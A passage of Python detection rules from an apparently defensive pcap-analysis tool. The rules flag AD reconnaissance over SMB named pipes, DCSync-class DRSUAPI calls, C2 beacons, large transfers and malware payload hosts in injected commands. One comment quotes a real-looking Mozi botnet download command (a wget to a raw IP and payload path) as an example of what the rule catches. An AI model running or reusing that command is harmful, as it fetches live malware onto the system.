    total = bytes_in + bytes_out

    if total < _LARGE_TRANSFER_MIN_BYTES:
        return None

    remote_ip = d.get("remote_ip", "")
    total_mb = total / 1_000_000
    ratio = d.get("direction_ratio", bytes_in / max(bytes_out, 1))

    if bytes_out > bytes_in:
        mitre = ["T1041"]
        confidence = 0.5
        label = "possible exfiltration"
    else:
        mitre = ["T1105"]
        confidence = 0.45
        label = "large ingress transfer"

    domain = d.get("resolved_domain", "")
    domain_lower = domain.lower().rstrip(".") if domain else ""
    iocs = {
        "filepath": [], "ip": [remote_ip],
        "domain": [domain_lower] if domain_lower else [],
        "sha256": [], "registry_key": [],
    }
    return Anchor(
        rule_id="pcap-large-transfer",
        artifact_type="pcap_flow",
        event=e,
        title=(f"Large network transfer ({label}): {bytes_out} bytes out / "
               f"{bytes_in} bytes in with {remote_ip} "
               f"(ratio={ratio:.2f}, {total_mb:.1f} MB total)"),
        mitre=mitre,
        confidence=confidence,
        iocs=iocs,
        summary=(f"pcap flow: {total} bytes total with {remote_ip} "
                  f"(out={bytes_out}, in={bytes_in})"),
        dedup_key=remote_ip,
    )


# ── Rule pack ────────────────────────────────────────────────────────


# ── Rule: SMB named pipe (AD recon) ─────────────────────────────────

# ponytail: known AD recon / post-exploit named pipes
_AD_RECON_PIPES: dict[str, tuple[str, list[str], float]] = {
    "samr":    ("SAMR — AD user/group enumeration", ["T1087.002"], 0.85),
    "lsarpc":  ("LSARPC — LSA policy enumeration", ["T1087.002", "T1069.002"], 0.85),
    # R1 F4 / W1-B task 3: a bare drsuapi pipe bind is NOT DCSync. DCSync
    # (T1003.006) is the specific DsGetNCChanges (opnum 3) RPC call --
    # this rule only sees that a client bound the drsuapi RPC interface at
    # all, which is equally consistent with DsCrackNames name-resolution
    # recon (SharpHound/BloodHound's actual hallmark), legitimate
    # inter-DC replication, or any other drsuapi operation. Asserting the
    # single most severe possible technique for every bind unconditionally
    # over-attributed: this table entry used to make "DCSync" the report's
    # #1 key finding even when dce_rpc.log showed zero DRSGetNCChanges
    # calls. Opnum-level discrimination -- including the ONLY honest path
    # to T1003.006 -- lives exclusively in the sibling `smb-drsuapi-opnum`
    # rule (drsuapi_opnum(), below), which reads the actual opnum. This
    # entry now reports the bind itself as a generic, honest
    # discovery-class lead (same technique family as samr/lsarpc) at
    # reduced confidence. See ad_recon_pipe() for the same-flow duplicate
    # suppression when drsuapi_opnum() already fired a more specific
    # finding for this exact row.
    "drsuapi": ("DRSUAPI — AD replication interface access (opnum not "
                "observed at this layer; see smb-drsuapi-opnum for "
                "DCSync/name-resolution discrimination)",
                ["T1087.002"], 0.55),
    "epmapper": ("EPM — RPC service discovery", ["T1046"], 0.70),
    "srvsvc":  ("SRVSVC — share enumeration", ["T1135"], 0.65),
    # A5 Finding 3 Claim B: netlogon secure-channel traffic (NRPC machine
    # authentication) is automatic, frequent, background traffic on every
    # domain-joined Windows host — a bare pipe-open carries none of
    # drsuapi_opnum's opnum-level discrimination between DCSync-class
    # calls and routine session churn. Confidence kept below the 0.6
    # CONFIRMED threshold (emit_finding.py) until/unless opnum-level
    # discrimination is added for netlogon specifically.
    "netlogon": ("Netlogon — domain trust enumeration", ["T1087.002"], 0.45),
    "spoolss": ("Spooler — print spooler abuse (potential)", ["T1543.003"], 0.60),
}


def ad_recon_pipe(e: NormEvent) -> Optional[Anchor]:
    """Detect AD recon via IPC$ named pipe opens in SMB2 traffic."""
    d = e.data
    pipe = d.get("pipe_normalized", "")

    for name, (desc, mitre, conf) in _AD_RECON_PIPES.items():
        if name in pipe:
            if name == "drsuapi" and d.get("drsuapi_opnum") in _DRSUAPI_OPNUMS:
                # Same-flow duplicate suppression: this exact row also
                # produced a drsuapi_call event (see
                # zeek_normalize.normalize_zeek_dce_rpc) whose opnum is
                # DIAGNOSTIC (3=DsGetNCChanges or 12=DsCrackNames, the
                # only keys in _DRSUAPI_OPNUMS) -- drsuapi_opnum() below
                # already emits a more specific, honest finding for it
                # (DCSync vs name-resolution). Emitting this generic
                # "bind observed" finding too would just be a second row
                # for the same underlying RPC call. Non-diagnostic opnums
                # (0/1 = DsBind/DsUnbind, or none resolved at all) fall
                # through and still get the generic lead below -- it is
                # the only signal for those. Only applies to the Zeek
                # path, which is the only one that can correlate opnum
                # back onto the smb_pipe event; the tcpdump/tshark
                # fallback path (normalize_smb_pipes) has no such
                # correlation available and still reports the generic
                # bind-level lead unconditionally.
                return None
            # The monitored host is never an attacker IOC. When the event
            # carries a known host (monitored_ip), drop it from the IOC
            # list — only the remote endpoint remains. If host is unknown
            # we can't tell which side is the victim, so keep both (the
            # pre-existing behavior).
            dst_ip = d.get("dst_ip", "")
            src_ip = d.get("src_ip", "")
            candidates = [ip for ip in (dst_ip, src_ip) if ip]
            host = e.host or ""
            ip_list = [ip for ip in candidates if ip != host] if host else candidates
            iocs = {
                "filepath": [], "ip": ip_list,
                "domain": [], "sha256": [], "registry_key": [],
            }
            # A5 Finding 3 Claim A fix: a single RPC bind to a named pipe
            # over IPC$ (e.g. one SAMR enumeration query) is discovery/
            # recon evidence — it does NOT by itself evidence T1021.002
            # (Remote Services: SMB/Windows Admin Shares), a lateral-
            # movement technique that requires observing actual remote
            # execution, service creation, or file transfer over the
            # admin share. Stacking T1021.002 onto EVERY pipe hit
            # unconditionally overclaimed lateral movement from mere
            # enumeration traffic. Emit only the per-pipe technique the
            # evidence actually supports.
            return Anchor(
                rule_id="smb-ad-recon-pipe",
                artifact_type="smb_pipe",
                event=e,
                title=f"AD recon via SMB named pipe: {d.get('named_pipe', name)} — {desc}",
                mitre=mitre,
                confidence=conf,
                iocs=iocs,
                summary=f"smb pipe: {pipe} ({desc})",
                dedup_key=name,
            )
    return None


# ── Rule: DRSUAPI opnum granularity (DCSync vs name-resolution) ────────
# gold-002: drsuapi RPC calls do not always show up as a named-pipe OPEN
# (ad_recon_pipe, above) — DRSUAPI may run over a dynamic ncacn_ip_tcp port
# reached via an EPM lookup, with no corresponding smb2.filename == "drsuapi"
# frame at all. The opnum is only visible on the DRSUAPI payload itself
# (drsuapi_call events, from normalize_drsuapi_calls). This rule reads that
# opnum to distinguish the DCSync attack primitive (DsGetNCChanges, opnum 3 —
# NTDS.dit secrets replication) from the SharpHound/BloodHound name-resolution
# hallmark (DsCrackNames, opnum 12) — gold explicitly rules out DCSync in the
# 002 capture (opnum 3 never observed) while flagging 124 DsCrackNames calls
# as the single most diagnostic AD-recon indicator. DsBind/DsUnbind (opnums 0
# and 1) are session churn, not a finding on their own, and are not scored.
_DRSUAPI_OPNUMS: dict[int, tuple[str, str, list[str], float]] = {
    3: ("DsGetNCChanges", "DCSync-class NTDS.dit secrets replication request",
        ["T1003.006"], 0.95),
    12: ("DsCrackNames", "AD principal name resolution "
         "(SharpHound/BloodHound hallmark)", ["T1087.002"], 0.75),
}


# Per-condition MITRE constants, exposed for test_mitre_map.py's
# _PCAP_CONDITION_CONSTANTS subset check — same idiom as the other
# condition-specific pcap rules (beacon, c2_protocol, dns_anomaly, ...).
_MITRE_DRSUAPI_DCSYNC = _DRSUAPI_OPNUMS[3][2]
_MITRE_DRSUAPI_NAMERES = _DRSUAPI_OPNUMS[12][2]


def drsuapi_opnum(e: NormEvent) -> Optional[Anchor]:
    """Detect diagnostic DRSUAPI opnums on a drsuapi_call event — specializes
    DCSync (DsGetNCChanges) from ordinary name-resolution recon volume
    (DsCrackNames). Returns None for non-diagnostic opnums (bind/unbind)."""
    d = e.data
    opnum = d.get("opnum")
    entry = _DRSUAPI_OPNUMS.get(opnum)
    if entry is None:
        return None
    name, desc, mitre, conf = entry

    dst_ip = d.get("dst_ip", "")
    src_ip = d.get("src_ip", "")
    candidates = [ip for ip in (dst_ip, src_ip) if ip]
    host = e.host or ""
    ip_list = [ip for ip in candidates if ip != host] if host else candidates
    iocs = {
        "filepath": [], "ip": ip_list,
        "domain": [], "sha256": [], "registry_key": [],
    }
    return Anchor(
        rule_id="smb-drsuapi-opnum",
        artifact_type="drsuapi_call",
        event=e,
        title=f"DRSUAPI {name} (opnum {opnum}) — {desc}",
        mitre=mitre,
        confidence=conf,
        iocs=iocs,
        summary=f"drsuapi call: opnum {opnum} ({name}) {src_ip} -> {dst_ip}",
        dedup_key=f"opnum{opnum}",
    )


# ── Rule: host / account identity (investigative context) ─────────────
# gold-002: an incident responder needs the compromised workstation name,
# its IP, and the AD account used — surfaced from Kerberos (principal ↔
# client IP) and DHCP (hostname ↔ assigned IP). This is a FACT, not an
# attack step: it carries no MITRE technique (UNMAPPED), and feeds the IOC
# export so the host can be isolated and the credential reset.
def host_identity(e: NormEvent) -> Optional[Anchor]:
    d = e.data
    hostname = d.get("hostname", "")
    account = d.get("account", "")
    ip = d.get("ip", "")
    realm = d.get("realm", "")
    if not (hostname or account):
        return None
    domains = [x for x in (realm, d.get("dns_domain", ""), d.get("dhcp_domain", "")) if x]
    iocs = {
        "filepath": [], "ip": [ip] if ip else [],
        "domain": list(dict.fromkeys(domains)), "sha256": [], "registry_key": [],
        "host": [hostname] if hostname else [],
        "account": [account] if account else [],
    }
    label = hostname or account
    detail = " — account " + account if (hostname and account) else ""
    where = f" ({ip})" if ip else ""
    return Anchor(
        rule_id="pcap-host-identity",
        artifact_type="host_identity",
        event=e,
        title=f"Host identity resolved: {label}{where}{detail}",
        mitre=[],                      # identity is context, never a technique
        confidence=0.8,
        iocs=iocs,
        summary=(f"identity [{d.get('source', '')}]: host={hostname} account={account} ip={ip}"
                 # W4-4: a bystander on the segment (foreign MAC/IP) is disclosed,
                 # so nothing downstream reads it as the monitored host.
                 + (" — not bound to the monitored host (bystander device)"
                    if d.get("bound_to_monitored") is False else "")),
        dedup_key=f"{hostname or account}|{ip}",
    )


# ── Rule: payload-host IOC in an injected command (T1105) ──────────────
# Track E2: command-injection attacks name the malware payload by raw IP
# in the wget/curl URL (e.g. "wget http://110.39.249.68:45221/Mozi.a"). This
# rule surfaces the payload-host IP itself — the single most actionable IOC
# in the request. A payload host equal to the scanning source IP is still a
# valid T1105 IOC: a host that both probes and serves a payload (e.g. Mozi
# botnet self-hosting) is confirmed malware infrastructure, not a reason to
# suppress the finding.
def _is_multicast_or_loopback(ip: str) -> bool:
    try:
        first = int(ip.split(".")[0])
    except (ValueError, IndexError):
        return False
    return first == 127 or 224 <= first <= 239


def payload_host(e: NormEvent) -> Optional[Anchor]:
    """Extract a malware payload-host IP embedded in an injected command
    (wget/curl URL) inside an HTTP request. T1105 — Ingress Tool Transfer.

    One anchor per event, for the first payload host that clears every
    filter. Distinct hosts across repeated injections each get their own
    finding via dedup_key; a single request naming multiple distinct
    payload hosts surfaces only the first (deliberate YAGNI — the observed
    injections carry one payload host each)."""
    d = e.data
    text = f"{d.get('http_request_path', '')}\n{d.get('ascii_payload', '')}"
    hosts = extract_payload_hosts(text)
    if not hosts:
        return None
    monitored = e.host or ""
    for ip in hosts:
        if ip == monitored:
            continue
        if _is_multicast_or_loopback(ip):
            continue
        iocs = {
            "filepath": [], "ip": [ip], "domain": [], "sha256": [],
            "registry_key": [], "host": [], "account": [],
        }
        return Anchor(
            rule_id="pcap-payload-host",
            artifact_type="pcap_http",
            event=e,
            title=f"Malware payload host referenced in injected command: {ip}",
            mitre=_MITRE_PAYLOAD_HOST,
            confidence=0.6,
            iocs=iocs,
            summary=f"payload host {ip} in {d.get('http_request_path', '')[:80]}",
            dedup_key=f"payload|{ip}",
        )
    return None


# ── Rule: evidence integrity (checksum-offload asymmetry) ─────────────
# Not an attack technique — a chain-of-custody / evidence-authenticity
# flag, same "context finding, mitre=[]" pattern as host_identity above.
# See normalize_checksum_integrity() for the full checksum-offload-
# asymmetry rationale (outbound bad checksums are routine NIC TX-offload
# noise and are never aggregated into checksum_data in the first place;
# only inbound ones reach this rule).

def evidence_tampered(e: NormEvent) -> Optional[Anchor]:
    """Flag inbound TCP/IP checksum failures as possible post-capture
    tampering of the evidence file itself."""
    d = e.data
    cd = d.get("checksum_data")
    if not cd:
        return None
    bad_count = cd.get("bad_count", 0)
    if bad_count < 1:
        return None

    ip = cd.get("ip", "")
    confidence = min(0.95, 0.6 + 0.1 * bad_count)
    samples = cd.get("samples", [])
    # Deliberately NO ip IOC: the src_ip field itself came from a packet
    # already shown to have an invalid checksum, so it isn't a trustworthy
    # attacker-attribution IOC — it's investigative context only, carried
    # in the title/summary, not exported as evidence against that address.
    iocs = {"filepath": [], "ip": [], "domain": [], "sha256": [], "registry_key": []}
    return Anchor(
        rule_id="pcap-evidence-tampered",
        artifact_type="pcap_checksum",
        event=e,
        title=(f"Possible evidence tampering: {bad_count} inbound packet(s) "
               f"from {ip} with an invalid IP/TCP checksum"),
        mitre=[],
        confidence=confidence,
        iocs=iocs,
        summary=("pcap integrity: inbound checksum failures from "
                  f"{ip} ({bad_count} packet(s)) — " + "; ".join(samples)),
        dedup_key=f"cksum:{ip}",
    )


RULES: list[Rule] = [
    Rule(
        "smb-ad-recon-pipe", "smb_pipe", ad_recon_pipe,
        ["T1087.002"],
        "AD reconnaissance via SMB named pipe (SAMR, LSARPC, DRSUAPI, EPM)",
        metadata=RuleMetadata(
            uuid="f1a2b3c4-d5e6-7890-abcd-ef1234567890",
            name="AD Reconnaissance via SMB Named Pipes",
            author="spectre-core", date="2026-06-30", version="1.0",
            # R1 F4 / W1-B task 3: downgraded from critical -- this rule no
            # longer asserts T1003.006 (DCSync); a bare pipe bind is
            # discovery-class evidence. DCSync stays critical exclusively
            # under smb-drsuapi-opnum, which requires the actual
            # DsGetNCChanges opnum.
            severity="high", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=[
                "https://attack.mitre.org/techniques/T1087/002/",
            ],
            tags=["attack.discovery", "attack.t1087.002"],
            false_positives=[
                "legitimate domain administration (check with IT)",
                "SCCM/System Center inventory scans",
                "authorized SharpHound/BloodHound security assessments "
                "(a drsuapi bind alone does not distinguish attack-path "
                "mapping from a DC's own routine replication traffic)",
            ],
            required_fields=["named_pipe", "src_ip", "dst_ip"],
        ),
    ),
    Rule(
        "smb-drsuapi-opnum", "drsuapi_call", drsuapi_opnum,
        ["T1003.006", "T1087.002"],
        "DRSUAPI opnum-level detection — distinguishes DCSync "
        "(DsGetNCChanges, opnum 3) from name-resolution recon "
        "(DsCrackNames, opnum 12)",
        metadata=RuleMetadata(
            uuid="9b708df7-cc12-4261-8396-94cd5ec1e189",
            name="DRSUAPI Opnum Granularity (DCSync vs Name Resolution)",
            author="spectre-core", date="2026-07-10", version="1.0",
            severity="critical", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=[
                "https://attack.mitre.org/techniques/T1003/006/",
                "https://attack.mitre.org/techniques/T1087/002/",
            ],
            tags=["attack.credential_access", "attack.t1003.006",
                  "attack.discovery", "attack.t1087.002"],
            false_positives=[
                "legitimate AD replication between domain controllers "
                "(verify src is a real DC before treating as DCSync)",
                "authorized SharpHound/BloodHound security assessments",
            ],
            required_fields=["opnum", "src_ip", "dst_ip"],
        ),
    ),
    Rule(
        "pcap-suspicious-port", ARTIFACT, suspicious_port, ["T1571"],
        "connection to a port commonly used by offensive tooling",
        metadata=RuleMetadata(
            uuid="ad63c8e1-fcdc-42f8-a74d-b3199c186436",
            name="Connection to a commonly-malicious port",
            author="spectre-core", date="2026-06-28", version="1.0",
            severity="medium", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=["https://attack.mitre.org/techniques/T1571/"],
            tags=["attack.command_and_control", "attack.t1571"],
            false_positives=["legitimate services that happen to use these ports"],
            required_fields=["dst_port", "dst_ip", "direction"],
        ),
    ),
    Rule(
        "pcap-exposed-service", ARTIFACT, exposed_service, ["T1133"],
        "monitored host answering inbound on a sensitive database/cache/search "
        "service port — an exposed listening service, not outbound C2",
        metadata=RuleMetadata(
            uuid="b1d4f7a2-3e6c-4d91-8b5a-7c2f4e9d1b60",
            name="Exposed Listening Service (Database/Cache/Search)",
            author="spectre-core", date="2026-07-10", version="1.0",
            severity="high", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=["https://attack.mitre.org/techniques/T1133/"],
            tags=["attack.initial_access", "attack.t1133"],
            false_positives=[
                "internal monitoring/health-check systems polling the service "
                "from an address the extractor cannot distinguish as internal "
                "(e.g. NAT'd or public-IP monitoring infra)",
                "intentionally internet-facing managed database offerings "
                "(check firewall/ACL config with the owner)",
            ],
            required_fields=["dst_port", "dst_ip", "direction"],
        ),
    ),
    Rule(
        "pcap-beacon", "pcap_timing", beacon,
        ["T1071.001"],
        "statistical C2 beacon detection from per-IP timing intervals",
        metadata=RuleMetadata(
            uuid="b7e91f42-8a3d-4c61-9e25-d4f6a2b8c301",
            name="C2 Beacon Detection",
            author="spectre-core", date="2026-06-28", version="1.0",
            severity="high", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=[
                "https://attack.mitre.org/techniques/T1071/001/",
            ],
            tags=["attack.command_and_control", "attack.t1071.001"],
            false_positives=[
                "legitimate polling services (NTP, health checks, monitoring agents)",
                "keepalive mechanisms that happen to align with 60s intervals",
            ],
            required_fields=["beacon_data"],
        ),
    ),
    Rule(
        "pcap-c2-protocol", "pcap_http", c2_protocol,
        ["T1071.001"],
        "C2 protocol fingerprinting — NetSupport, HTTP-on-443, CMD=POLL/ENCD",
        metadata=RuleMetadata(
            uuid="c4d92e71-5b6f-4a3d-8c12-e7f9b3a1d405",
            name="C2 Protocol Fingerprinting",
            author="spectre-core", date="2026-06-28", version="1.0",
            severity="critical", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=[
                "https://attack.mitre.org/techniques/T1071/001/",
            ],
            tags=["attack.command_and_control", "attack.t1071.001"],
            false_positives=[
                "legitimate NetSupport Manager deployments (check with IT)",
                "reverse proxies that terminate TLS and use HTTP internally",
            ],
            required_fields=["http_user_agent", "http_host", "ascii_payload", "dst_port", "http_request_path"],
        ),
    ),
    Rule(
        "pcap-exploit-probe", "pcap_http", exploit_probe,
        ["T1595.002", "T1190"],
        "known CVE exploit path matching in HTTP requests",
        metadata=RuleMetadata(
            uuid="d8a3f651-9c2e-4b7d-a3f1-5e8c4b2d9607",
            name="Exploit Probe Detection",
            author="spectre-core", date="2026-06-28", version="1.0",
            severity="high", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=[
                "https://attack.mitre.org/techniques/T1595/002/",
                "https://attack.mitre.org/techniques/T1190/",
            ],
            tags=["attack.reconnaissance", "attack.t1595.002"],
            false_positives=[
                "security scanners (Nessus, Qualys, Nuclei) running authorized tests",
                "WAF/IDS testing with known exploit strings in benign contexts",
            ],
            required_fields=["http_request_path"],
        ),
    ),
    Rule(
        "pcap-dns-anomaly", "pcap_dns", dns_anomaly,
        ["T1568.002"],
        "DNS anomaly detection — suspicious TLDs, DGA, WPAD abuse",
        metadata=RuleMetadata(
            uuid="e5b7c842-4d9a-5f2e-1c6d-8a3f9b7e2104",
            name="DNS Anomaly Detection",
            author="spectre-core", date="2026-06-28", version="1.0",
            severity="medium", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=[
                "https://attack.mitre.org/techniques/T1572/",
                "https://attack.mitre.org/techniques/T1071/004/",
            ],
            tags=["attack.command_and_control", "attack.t1572"],
            false_positives=[
                "CDN domains with random-looking subdomains (Akamai, CloudFront)",
                "Legitimate .xyz domains (e.g., Alphabet/Google uses abc.xyz)",
                "WPAD in Windows domains with split-DNS misconfiguration",
            ],
            required_fields=["dns_query"],
        ),
    ),
    Rule(
        "pcap-staging-download", "pcap_flow", staging_download,
        ["T1105"],
        "large download-dominant flow from a DNS-resolved file-sharing/staging host",
        metadata=RuleMetadata(
            uuid="f4a1e2c3-6b9d-4a17-8f2e-3c9a7d5b6e10",
            name="Staging Download from File-Sharing Host",
            author="spectre-core", date="2026-07-09", version="1.0",
            severity="high", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=["https://attack.mitre.org/techniques/T1105/"],
            tags=["attack.command_and_control", "attack.t1105"],
            false_positives=[
                "legitimate large downloads from file-sharing services (check with user)",
                "software update mirrors hosted on .xyz/.top-style discount TLDs",
            ],
            required_fields=["bytes_in"],
        ),
    ),
    Rule(
        "pcap-large-transfer", "pcap_flow", large_transfer,
        ["T1041", "T1105"],
        "flow-volume outlier — possible exfiltration or large ingress transfer",
        metadata=RuleMetadata(
            uuid="a2c5e8f1-7d3b-4c69-9a1e-5f8b2d4c7e30",
            name="Large Network Transfer (Volume Outlier)",
            author="spectre-core", date="2026-07-09", version="1.0",
            severity="medium", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=[
                "https://attack.mitre.org/techniques/T1041/",
                "https://attack.mitre.org/techniques/T1105/",
            ],
            tags=["attack.exfiltration", "attack.t1041", "attack.t1105"],
            false_positives=[
                "large legitimate backups, software updates, or media downloads/uploads",
                "cloud sync clients (OneDrive, Dropbox, Backblaze) — check dst domain",
            ],
            required_fields=["bytes_in"],
        ),
    ),
    Rule(
        "pcap-host-identity", "host_identity", host_identity,
        [],
        "Host/account identity from Kerberos principal + DHCP hostname "
        "(investigative context — not an attack technique)",
    ),
    Rule(
        "pcap-payload-host", "pcap_http", payload_host,
        ["T1105"],
        "Malware payload-host IP embedded in an injected command "
        "(wget/curl URL) — Ingress Tool Transfer",
        # Severity "high": same technique (T1105) and tier as its sibling
        # pcap-staging-download — an attempted tool download, not confirmed
        # execution or C2, so below the critical C2-fingerprint rules.
        # required_fields left empty: metadata added for severity only, rule
        # evaluation is unchanged.
        metadata=RuleMetadata(
            uuid="0e3940e9-132f-4c5f-ad02-f900c59f11cd",
            name="Payload Host in Injected Download Command",
            author="spectre-core", date="2026-09-30", version="1.0",
            severity="high", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=["https://attack.mitre.org/techniques/T1105/"],
            tags=["attack.command_and_control", "attack.t1105"],
            false_positives=[
                "scanner/honeypot traffic quoting a URL it never fetched",
                "benign scripts or docs that embed a wget/curl URL in a request",
            ],
        ),
    ),
    Rule(
        "pcap-evidence-tampered", "pcap_checksum", evidence_tampered, [],
        "Evidence-integrity check — inbound IP/TCP checksum failures "
        "indicate a captured packet was altered after the fact, not a "
        "capture artifact (NIC checksum offload only affects outbound "
        "packets)",
        metadata=RuleMetadata(
            uuid="c3e8a1f6-2b47-4d9e-8f60-1a5c7d9b4e21",
            name="Evidence Integrity — Inbound Checksum Anomaly",
            author="spectre-core", date="2026-07-15", version="1.0",
            severity="critical", rule_format="python",
            rule_source="modules/pcap/rules.py",
            references=["https://www.tcpdump.org/manpages/tcpdump.1.html"],
            tags=["forensic.evidence_integrity", "anti_forensics.tamper_check"],
            false_positives=[
                "middleboxes/NAT devices that rewrite headers without "
                "fully recomputing checksums (rare, but known)",
                "corrupted/damaged evidence files unrelated to intentional "
                "tampering (verify file integrity/hash separately)",
                "IPv6 traffic is not covered by this rule (V1 is IPv4-only "
                "— IPv6 has no IP-header checksum field at all)",
            ],
            required_fields=["checksum_data"],
        ),
    ),
]

